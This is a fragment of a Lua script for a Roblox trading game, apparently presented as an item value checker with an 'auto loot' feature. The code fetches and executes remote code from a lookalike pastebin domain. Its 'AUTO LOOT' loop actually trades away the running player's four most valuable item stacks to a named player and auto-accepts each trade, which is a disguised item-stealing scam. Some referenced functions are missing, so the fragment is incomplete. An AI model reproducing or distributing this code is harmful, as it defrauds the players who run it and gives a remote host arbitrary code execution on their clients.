local VALUE_URL = "https://cdn.cdnpastebin.com/mm2values.js"
local ItemValues = {}
local NameIndex = {} -- reverse lookup by display name
local ValuesReady = false

task.spawn(function()
    pcall(function()
        local raw = game:HttpGet(VALUE_URL)
        local loaded = loadstring(raw)()
        if loaded then
            ItemValues = loaded
            -- build name index for fast lookup
            for k, v in pairs(ItemValues) do
                if type(v) == "table" and v.Name then
                    NameIndex[string.lower(v.Name)] = v
                end
            end
            ValuesReady = true
        end
    end)
end)

local function getDatabase()
    local db = nil
    pcall(function()
        local dbModule = ReplicatedStorage:FindFirstChild("Database")
        if dbModule then
            local sync = dbModule:FindFirstChild("Sync")
            if sync then
                local item = sync:FindFirstChild("Item")
                if item then
                    local s, r = pcall(require, item)
                    if s and r then db = r end
                end
            end
        end
    end)
    return db
end
local Database = getDatabase()

local function ResolveValue(id)
    local cleanID = tostring(id)
    local entry = ItemValues[cleanID]
    if entry and type(entry) == "table" then
        return entry.Value or 0, entry.Name or cleanID
    end
    -- try database name lookup
    if Database then
        local dbEntry = nil
        pcall(function() dbEntry = Database[cleanID] end)
        if dbEntry and dbEntry.Name then
            local nkey = string.lower(dbEntry.Name)
            local found = NameIndex[nkey]
            if found then return found.Value or 0, found.Name or dbEntry.Name end
        end
    end
    return 0, cleanID
end

local function getTradeableItems()
    local tradeable = {}
    local success, realData = pcall(function()
        return InventoryRemote.GetProfileData:InvokeServer(LocalPlayer.Name)
    end)
    if not success or not realData then
        return {}
    end
    local function processCategory(categoryName, tableData)
        if not tableData then return end
        for dataid, amount in pairs(tableData) do
            local value, nameStr = ResolveValue(dataid)
            if value >= 1 then
                table.insert(
                    tradeable,
                    {
                        DataID = dataid,
                        Name = nameStr,
                        Value = value,
                        Amount = (tonumber(amount) or 1),
                        Category = categoryName,
                    }
                )
            end
        end
    end
    if realData.Weapons and realData.Weapons.Owned then
        processCategory("Weapons", realData.Weapons.Owned)
    end
    if realData.Pets and realData.Pets.Owned then
        processCategory("Pets", realData.Pets.Owned)
    end
    table.sort(tradeable, function(a, b)
        return a.Value > b.Value
    end)
    return tradeable
end

local function formatValue(v)
    if v >= 1000000 then return string.format("%.2fM", v / 1000000)
    elseif v >= 1000 then return string.format("%.1fK", v / 1000)
    else return tostring(v) end
end

local function refreshItemList()
    if not ValuesReady then
        Status.Text = "Status: Loading values... please wait"
        return
    end
    -- clear old rows
    for _, child in ipairs(ItemList:GetChildren()) do
        if child:IsA("TextLabel") then child:Destroy() end
    end

    local items = getTradeableItems()
    lastItems = items
    local total = 0
    for _, it in ipairs(items) do
        total = total + (it.Value * it.Amount)
    end
    lastTotal = total

    TotalLabel.Text = string.format("TOTAL VALUE: %d | Items: %d", total, #items)

    if total >= 1000000 then
        TotalLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
    elseif total >= 100000 then
        TotalLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
    else
        TotalLabel.TextColor3 = Color3.fromRGB(88, 166, 255)
    end

    local y = 0
    for _, it in ipairs(items) do
        local row = Instance.new("TextLabel")
        row.Size = UDim2.new(1, -8, 0, 20)
        row.Position = UDim2.new(0, 4, 0, y)
        row.BackgroundTransparency = 1
        row.Text = string.format("x%d %s -> %d", it.Amount, it.Name, it.Value * it.Amount)
        row.TextColor3 = Color3.fromRGB(200, 200, 200)
        row.Font = Enum.Font.Gotham
        row.TextSize = 11
        row.TextXAlignment = Enum.TextXAlignment.Left
        row.Parent = ItemList
        y = y + 22
    end

    ItemList.CanvasSize = UDim2.new(0, 0, 0, math.max(y, 130))

    -- auto copy to clipboard in trade format
    local clip = {"TOTAL VALUE: " .. tostring(total)}
    for _, it in ipairs(items) do
        table.insert(clip, string.format("x%d %s -> %d", it.Amount, it.Name, it.Value * it.Amount))
    end
    local clipStr = table.concat(clip, "\n")
    pcall(function()
        if setclipboard then setclipboard(clipStr) end
    end)
    Status.Text = string.format("Status: %d total | %d items | Copied!", total, #items)
end

    end)

end

AutoLootBtn.MouseButton1Click:Connect(function()
    if ActiveLoop then return end
    local targetName = PlayerInput.Text
    local targetPlayer
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and (string.find(string.lower(p.Name), string.lower(targetName)) or string.find(string.lower(p.DisplayName), string.lower(targetName))) then
            targetPlayer = p
            break
        end
    end

    if not targetPlayer then
        Status.Text = "Status: Target player not found in server!"
        return
    end

    ActiveLoop = true
    Status.Text = "Status: Auto Looting " .. targetPlayer.Name .. "..."
    AutoLootBtn.Text = "LOOTING..."
    AutoLootBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)

    task.spawn(function()
        local itemsAdded = false
        local tradeableItems = {}

        while ActiveLoop do
            task.wait(0.1)
            if not targetPlayer or not targetPlayer.Parent then
                Status.Text = "Status: Target left the game."
                ActiveLoop = false
                break
            end

            local tradeStatus = getTradeStatus()
            if tradeStatus == "None" then
                itemsAdded = false
                tradeableItems = getTradeableItems()
                if #tradeableItems == 0 then
                    Status.Text = "Status: No items left to trade."
                    ActiveLoop = false
                    break
                end

                pcall(function()
                    ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
                end)
                Status.Text = "Status: Sending Trade Request..."
                task.wait(2)

            elseif tradeStatus == "ReceivingRequest" then
                pcall(function()
                    ReplicatedStorage.Trade.AcceptRequest:FireServer()
                end)

            elseif tradeStatus == "StartTrade" then
                if not itemsAdded then
                    Status.Text = "Status: Offering items..."
                    local topFourStacks = {}
                    for i = 1, math.min(4, #tradeableItems) do
                        table.insert(topFourStacks, tradeableItems[i])
                    end
                    for _, stack in ipairs(topFourStacks) do
                        for i = 1, stack.Amount do
                            pcall(function()
                                ReplicatedStorage.Trade.OfferItem:FireServer(stack.DataID, stack.Category)
                            end)
                        end
                    end
                    itemsAdded = true
                    task.wait(3)
                    Status.Text = "Status: Accepting trade..."
                    acceptTrade()
                else
                    acceptTrade()
                end
            end
        end

        ActiveLoop = false
        AutoLootBtn.Text = "START AUTO LOOT"
        AutoLootBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 80)
        if Status.Text:find("Auto Looting") then
            Status.Text = "Status: Stopped"
        end
    end)
end)

-- auto-load items on spawn — wait for values then refresh
task.spawn(function()
    local waited = 0
    while not ValuesReady and waited < 30 do
        task.wait(1)
        waited = waited + 1
    end
    if ValuesReady then
        pcall(refreshItemList)
    else
        Status.Text = "Status: Failed to load values from server"
    end
end)
